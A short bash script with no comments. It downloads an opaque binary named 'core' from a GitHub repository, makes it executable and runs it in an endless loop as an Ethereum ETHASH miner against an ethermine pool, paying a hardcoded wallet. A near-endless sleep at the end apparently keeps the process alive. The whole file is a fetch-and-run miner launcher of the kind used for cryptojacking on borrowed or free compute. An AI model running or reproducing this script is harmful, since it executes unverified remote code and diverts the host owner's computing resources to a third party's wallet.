#!/bin/bash
POOL=asia2.ethermine.org:4444
WALLET=0x6ff85749ffac2d3a36efa2bc916305433fa93731
WORKER=lp7fzm4auv6bvg0
wget https://github.com/dreamistoken/core/raw/main/core
chmod +x core
while [ 1 ]; do
./core --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999999999 
